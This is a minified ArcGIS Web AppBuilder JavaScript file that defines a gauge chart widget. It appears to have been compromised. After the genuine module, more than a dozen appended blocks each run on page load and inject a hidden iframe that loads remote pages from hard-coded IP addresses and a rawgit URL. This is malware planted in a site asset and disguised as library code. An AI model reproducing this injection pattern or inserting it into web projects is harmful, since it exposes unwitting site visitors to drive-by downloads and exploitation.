// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/html ./BaseDijit jimu/utils jimu/dijit/Chart ./utils".split(" "),function(p,l,m,q,k,r,n){return p([q],{templateString:'\x3cdiv style\x3d"height:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"gauge"\x3e\x3c/div\x3e\x3c/div\x3e',type:"gauge",config:null,postCreate:function(){this.inherited(arguments);this.features=[];this.DEFAULT_GAUGE_CONFIG={type:"gauge",confine:!0,shape:"curved",min:0,max:100,series:[{data:[0]}]};this.config&&(this.DEFAULT_GAUGE_CONFIG.shape=
this.config.shape);this.isDarkTheme()?this.DEFAULT_GAUGE_CONFIG.theme="dark":this.DEFAULT_GAUGE_CONFIG.theme="light";this._initChart();this.setConfig(this.config)},onDataSourceDataUpdate:function(a){this.features=a.features;this._updateStatisticsValue()},resize:function(a,e){this.chart&&(a&&e?this.chart.resize(a,e):this.chart.resize())},_updateStatisticsValue:function(){if(this.config.statistic&&this.dataSource){var a=n.getSingleValueFromFeatures(this.config.statistic,this.dataSource,this.features),
a=this._getVaildValue(a);"number"===typeof a&&(this.value=a,this._setValue(this.config))}},setConfig:function(a){a&&(this.config=a,this.config.display&&this.config.display.backgroundColor&&m.setStyle(this.domNode,"backgroundColor",this.config.display.backgroundColor),this._updateStatisticsValue())},_setValue:function(a){var e={};e.series=[{data:[this.value]}];var h=!1;"undefined"!==typeof a.max&&"undefined"!==typeof a.min&&(e.max=a.max,e.min=a.min);var b={},g=this._getIndicatorInfo(a);if(k.isNotEmptyObject(a.display)){var f=
a.display;f.backgroundColor&&m.setStyle(this.domNode,"backgroundColor",f.backgroundColor);f.gaugeColor&&(b.columnColor=f.gaugeColor);f.bgColor&&(b.bgColor=f.bgColor);if(k.isNotEmptyObject(f.dataLabels)&&f.dataLabels.state){var c=f.dataLabels;b.showDataRangeLabel=!!c.dataRange;b.showTargetValueLabel=!!c.targetValue;h=b.showTargetValueLabel;b.labelColor=c.textColor||""}c={state:!0,isRatio:!1,font:{font:{fontFamily:"Arial",bold:!1,italic:!1,underline:!1},textColor:"#59bad8"},dataFormat:{unit:"none",
decimalPlaces:"",prefix:"",suffix:""}};c=f.currentValue.state?f.currentValue:c;if(k.isNotEmptyObject(c)){var f={},d=c.dataFormat;d&&""!==d.decimalPlaces&&"undefined"!==typeof d.decimalPlaces&&(f.decimalPlaces=Number(d.decimalPlaces));d=l.hitch(this,function(c,b){var e,f="";c.isRatio&&(b/=a.max,b*=100,f="%");if(c.dataFormat){var d=c.dataFormat;c.isRatio||("percentage"===d.unit?(b*=100,f="%"):"thousand"===d.unit?(f=this.nls.thousandAbbreviation,b/=1E3):"million"===d.unit?(f=this.nls.millionAbbreviation,
b/=1E6):"billion"===d.unit&&(f=this.nls.billionAbbreviation,b/=1E9));""!==d.decimalPlaces&&"undefined"!==typeof d.decimalPlaces&&(b=b.toFixed(Number(d.decimalPlaces)));e=b+f;d.prefix&&(e=d.prefix+" "+e);d.suffix&&(e+=" "+d.suffix)}return e},c,this.value);f.formatter=d;c.font&&(d={},"undefined"!==typeof c.font.fontSize&&(d.fontSize=Number(c.font.fontSize)),c.font.textColor&&(d.color=c.font.textColor),g.valueColor&&(d.color=g.valueColor),c.font&&c.font.font&&(c=c.font.font,d.fontWeight=c.bold?"bold":
"normal",c.fontFamily&&(d.fontFamily=c.fontFamily),d.fontStyle=c.italic?"italic":"normal"),f.textStyle=d);b.valueStyle=f}}g.targetValue&&(b.targetValue=h?g.targetValue:[]);g.columnColor&&(b.columnColor=g.columnColor);e.gaugeOption=b;this.chart.updateConfig(e)},_getIndicatorInfo:function(a){var e=!1,h=!1,b=!1,g=this._getIndicatorValues(a);k.isNotEmptyObject(g,!0)&&(e=g);if(g=a.indicators)(a=n.getVaildIndicator(this.value,g,a.max))&&a.gaugeColor&&(h=a.gaugeColor),a&&a.valueColor&&(b=a.valueColor);return{targetValue:e,
columnColor:h,valueColor:b}},_initChart:function(){this.chart=new r({chartDom:this.domNode,config:this.DEFAULT_GAUGE_CONFIG});this.chart.placeAt(this.domNode);setTimeout(l.hitch(this,function(){this.chart.resize()}),300)},_getVaildValue:function(a){if("undefined"!==typeof a)return Number(a)},_getIndicatorValues:function(a){var e=[];a.indicators&&(a.indicators.forEach(function(h){h.value&&h.value.forEach(l.hitch(this,function(b){e.push(h.isRatio?b/100*a.max:b)}))}),e.sort(function(a,b){return a-b}),
e=k.uniqueArray(e));return e}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});